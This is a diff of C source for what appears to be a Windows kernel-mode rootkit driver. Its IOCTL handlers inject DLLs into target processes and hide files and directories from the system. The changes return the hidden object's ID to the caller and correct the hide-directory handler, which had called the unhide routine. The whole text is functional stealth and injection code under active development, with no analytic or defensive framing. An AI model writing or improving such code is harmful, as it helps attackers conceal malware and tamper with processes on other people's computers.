@@ -82,14 +82,14 @@ NTSTATUS IOInjectDLL(PBUT_DLL_INJECTION_PACKET pPacket, SIZE_T szSize) {
 	return InjectDLL(pPacket->dwProcessId, &dllPath);
 }
 
-NTSTATUS IOHideFile(PBUT_HIDE_FILE_PACKET pPacket, SIZE_T szSize) {
+NTSTATUS IOHideFile(PBUT_HIDE_FILE_PACKET pPacket, SIZE_T szSize, PULONG pObjectId) {
 	if (szSize < sizeof(BUT_HIDE_FILE_PACKET)) {
 		return STATUS_INVALID_PARAMETER;
 	}
 
 	UNICODE_STRING filePath;
 	RtlInitUnicodeString(&filePath, pPacket->wFullPath);
-	return AddHiddenFile(&filePath, &pPacket->uObjectId);
+	return AddHiddenFile(&filePath, pObjectId);
 }
 
 NTSTATUS IOUnhideFile(PBUT_UNHIDE_FILE_PACKET pPacket, SIZE_T szSize) {
@@ -100,14 +100,14 @@ NTSTATUS IOUnhideFile(PBUT_UNHIDE_FILE_PACKET pPacket, SIZE_T szSize) {
 	return RemoveHiddenFile(pPacket->uObjectId);
 }
 
-NTSTATUS IOHideDirectory(PBUT_HIDE_DIRECTORY_PACKET pPacket, SIZE_T szSize) {
+NTSTATUS IOHideDirectory(PBUT_HIDE_DIRECTORY_PACKET pPacket, SIZE_T szSize, PULONG pObjectId) {
 	if (szSize < sizeof(BUT_HIDE_DIRECTORY_PACKET)) {
 		return STATUS_INVALID_PARAMETER;
 	}
 
 	UNICODE_STRING filePath;
 	RtlInitUnicodeString(&filePath, pPacket->wFullPath);
-	return AddHiddenDir(&filePath, &pPacket->uObjectId);
+	return AddHiddenDir(&filePath, pObjectId);
 }
 
 NTSTATUS IOUnhideDirectory(PBUT_UNHIDE_DIRECTORY_PACKET pPacket, SIZE_T szSize) {
@@ -222,7 +222,7 @@ NTSTATUS IRPIoControl(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
 
 		case BUT_IOCTL_HIDE_FILE: {
 			statusPacket.ntStatus = IOHideFile((PBUT_HIDE_FILE_PACKET)pInputBuffer,
-				szInputBufferSize);
+				szInputBufferSize, &statusPacket.info.uObjectId);
 			break;
 		}
 
@@ -233,8 +233,8 @@ NTSTATUS IRPIoControl(PDEVICE_OBJECT pDeviceObject, PIRP pIrp) {
 		}
 
 		case BUT_IOCTL_HIDE_DIRECTORY: {
-			statusPacket.ntStatus = IOUnhideDirectory((PBUT_HIDE_DIRECTORY_PACKET)pInputBuffer,
-				szInputBufferSize);
+			statusPacket.ntStatus = IOHideDirectory((PBUT_HIDE_DIRECTORY_PACKET)pInputBuffer,
+				szInputBufferSize, &statusPacket.info.uObjectId);
 			break;
 		}
 
